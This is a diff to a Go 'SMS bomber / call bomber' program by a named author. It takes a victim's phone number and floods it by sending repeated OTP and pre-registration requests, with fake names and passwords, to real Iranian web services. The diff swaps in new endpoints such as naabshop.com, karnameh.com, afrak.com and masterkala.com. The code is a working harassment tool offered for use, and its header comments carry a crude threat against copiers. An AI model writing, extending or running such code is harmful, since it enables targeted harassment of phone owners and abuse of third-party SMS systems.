@@ -1,6 +1,9 @@
 /* coded by @monsmain
 ⚠️note: copy mamnoe.
 ❌befahmam copy kardi khahareto migam...*/
+/* coded by @monsmain
+⚠️note: copy mamnoe.
+❌befahmam copy kardi khahareto migam...*/
 package main
 
 import (
@@ -19,7 +22,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-
 	"net/http/cookiejar"
 	"math/rand" 
 )
@@ -342,8 +344,6 @@ var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaBrowser/23.2.0.0 Safari/537.36",
 }
-
-
 //Code by @monsmain
 func clearScreen() {
 	cmd := exec.Command("clear")
@@ -546,7 +546,7 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 		return
 	}
 }
-// Code by @monsmain
+//Code by @monsmain
 func formatPhoneWithSpaces(p string) string {
 	p = getPhoneNumberNoZero(p)
 	if len(p) >= 10 {
@@ -623,7 +623,7 @@ func main() {
 	fmt.Print("\033[0m")
 
 
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
+	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m156 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	var phone string
 	fmt.Scan(&phone)
@@ -671,11 +671,11 @@ cookieJar, _ := cookiejar.New(nil)
         Timeout: 10 * time.Second,
 	}
 
-	tasks := make(chan func(), repeatCount*100)
+	tasks := make(chan func(), repeatCount*142)
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*100)
+	ch := make(chan int, repeatCount*142)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -686,17 +686,83 @@ cookieJar, _ := cookiejar.New(nil)
 	}
 
 	for i := 0; i < repeatCount; i++ {
+		
 
-        	//Telewebion
-		wg.Add(1) 
+
+
+
+
+                // naabshop.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98")
+				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
+				formData.Set("action_type", "phone")
+				formData.Set("digits_reg_name", "testname") 
+				formData.Set("digits_reg_lastname", "testlastname") 
+				formData.Set("digits_process_register", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("rememberme", "1")
+				formData.Set("digits", "1")
+				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "login")
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("digits_form", "28e10ee7bd")
+				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("show_force_title", "1")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+
+				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+		//karnameh.com
+		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"code":      "98",
-					"phone":     getPhoneNumberNoZero(phone),
-					"smsStatus": "default",
+					"phone_number": phone,
 				}
-				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
+				sendJSONRequest(c, ctx, "https://api-gw.karnameh.com/switch/api/auth/otp/send/", payload, &wg, ch)
+			}
+		}(client)
+		// afrak.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"first_name": "تست نام", //ی
+					"phone_number": phone, 
+					"password": "testpassword123", 
+					"code": "",
+					"invite_id": "",
+					"rules": true,
+				}
+				sendJSONRequest(c, ctx, "https://client.afrak.com/api/v1/pre-register", payload, &wg, ch)
+			}
+		}(client)
+		//masterkala.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
+				payload := map[string]interface{}{
+					"type": "sendotp",
+					"phone": phone,
+				}
+				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
 			}
 		}(client)
 
@@ -717,6 +783,9 @@ cookieJar, _ := cookiejar.New(nil)
 		}
 	}
 }
+/* coded by @monsmain
+⚠️note: copy mamnoe.
+❌befahmam copy kardi khahareto migam...*/
 /* coded by @monsmain
 ⚠️note: copy mamnoe.
 ❌befahmam copy kardi khahareto migam...*/
